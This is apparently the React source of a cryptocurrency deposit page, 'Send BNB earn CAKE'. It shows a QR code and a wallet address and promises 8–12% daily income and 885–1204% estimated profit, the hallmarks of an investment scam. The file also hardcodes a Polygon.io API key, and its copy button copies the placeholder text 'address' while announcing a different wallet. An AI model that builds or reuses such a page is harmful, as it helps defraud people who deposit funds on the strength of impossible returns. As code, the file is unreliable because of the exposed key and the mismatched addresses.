import React, { useEffect, useState } from "react";
import Faq from "./faq";
import copy from "copy-to-clipboard";
import QRCode from "react-qr-code";
import ToastMessage from "../components/toast";
import {
  polygonClient,
  restClient,
  websocketClient,
} from "@polygon.io/client-js";
const rest = restClient("1FgrgoP4ppyWPLVDYtxbN1BlVG2IjItv");
import axios from "axios";
import { connect } from "react-redux";


import { useToasts } from "react-toast-notifications";
import { CopyToClipboard } from "react-copy-to-clipboard";

// import Binance from 'node-binance-api'
// const binance = new Binance().options({
//   APIKEY: '<key>',
//   APISECRET: '<secret>'
// });

function Main(props) {
  // const fetchPrice = () => {
  //   binance.prices('BNBBTC', (error, ticker) => {
  //     console.info("Price of BNB: ", ticker.BNBBTC);
  //   });

  // }

  const publicAddress = "0xxskskskek"

  const coinList = [
    { CoinName: "Select Asset", ShortName: "Select Assest" },
    { CoinName: "Bitcoin", ShortName: "BTC" },
    { CoinName: "Lumen", ShortName: "XLM" },
    { CoinName: "BinanceCoin", ShortName: "BNB" },
    { CoinName: "Ethereum", ShortName: "ETH" },
  ];

  const prices = props.prices


  const crytoPrices = {
    BitcoinInDollar: prices.BitcoinPriceinDollar,
    EthereumInDollar: prices.EthereumPriceinDollar,
    LumenInDollar: prices.LumenPriceinDollar,
    RipplePriceInDollar: prices.RipplePriceinDollar,
    BinanceCoinInDollar: prices.BinanceCoinPriceinDollar,
  };

  const { addToast } = useToasts();
  // ------------- ------------------- ///
  const notifyEvent = (type, message) => {
    switch (type) {
      case "Success":
        addToast(message, { appearance: "success" });
        break;
      case "Error":
        addToast(message, { appearance: "error" });
        break;
      case "Info":
        addToast(message, { appearance: "info" });
        break;
      default:
        break;
    }

    return true;
  };

  const copyItemNotify = (x) => {
    notifyEvent("Success", `${x} Copied`);
  };

  return (
    <>
      <div className="row">
        <div className="col-sm-12 col-1g-6 col-md-6  flex-c">
          <span className="img-box">
            {/* <QRCode
              className="QR-flexContain"
              value={publicAddress} /> */}
            <img
              src="http://api.qrserver.com/v1/create-qr-code/?color=000000&amp;bgcolor=FFFFFF&amp;data=0xa0b8F971300734F903A7Ca5E24c505feC3B0622E&amp;qzone=1&amp;margin=0&amp;size=400x400&amp;ecc=L"
              alt="qr code"
            />
          </span>
        </div>
        <div className=" col-sm-12 col-1g-6 col-md-6 ">
          <h3 className="text-center">
            Send <span style={{ color: "black" }}>BNB</span> earn
            <span style={{ color: "#b62f4f" }}> CAKE</span>{" "}
          </h3>
          <span className="cake-img">
            <img src="https://www.logo.wine/a/logo/Binance/Binance-BNB-Icon-Logo.wine.svg" />

            <img
              className="pr-5 pt-3"
              src="https://cryptologos.cc/logos/pancakeswap-cake-logo.png"
              style={{ height: "79px" }}
            />
          </span>
          <p className="text-center">
            <b>1 BNB = ${crytoPrices.BinanceCoinInDollar}</b>
          </p>
        </div>
      </div>

      <div className="bg-bnb flex-c">
        <span>
          <p className="text-center ">
            <p className="text-center">
              <b>Total Income; based on your stake plan (8-12 %) daily </b>
            </p>
            <p className="text-center">
              <b>Interest Rate ; 1% every 24 hours (New Deposits Only)</b>
            </p>
            <p className="text-center">
              <b>Minimal Deposit ; 0.1 BNB</b>{" "}
            </p>
            <p className="text-center">
              <b>Maximum Deposit ; 140 BNB</b>
            </p>
            <p className="text-center">
              <b>
                Withdraw Limit ; None (Earned Cakes can be withdrawn after 20
                Days)
              </b>
            </p>
            <p className="text-center">
              <b>Estimated Profit ; (885% ~ 1204%) Minimal Deposit</b>
            </p>
          </p>
        </span>

        <div className="addresss flex-r-c">
          <span className="">
            <p>{publicAddress.substring(0, 24)}...</p>
          </span>
          <span className="pl-3">
            {/* <i
              onClick={
                () => {
                  copyText("0xa0b8F971300734F903A7Ca5E24c505feC3B0622E");
                }
                // notify("success", "Success!")
              }
              class="transactionPortal-address-icon fa fa-clone"
            ></i> */}
            <CopyToClipboard
              text={"address"}
              onCopy={() => copyItemNotify("0x8348a615853053D3c501C7ff850e27dfeEBB5f91")}
            >
              <i className="transactionPortal-address-icon fa fa-clone"></i>
            </CopyToClipboard>
          </span>
        </div>

        <span className=" text-center">
          <i class="fa fa-spinner fa-spin fa-3x fa-fw"></i>
          <span class="sr-only">Loading...</span>
          <h3></h3>
        </span>
      </div>

      <div className="faq">
        <Faq />
      </div>
    </>
  );
}

const mapStateToProps = (state) => {
  return {
    prices: state.prices,
  };
};

export default connect(mapStateToProps, null)(Main);
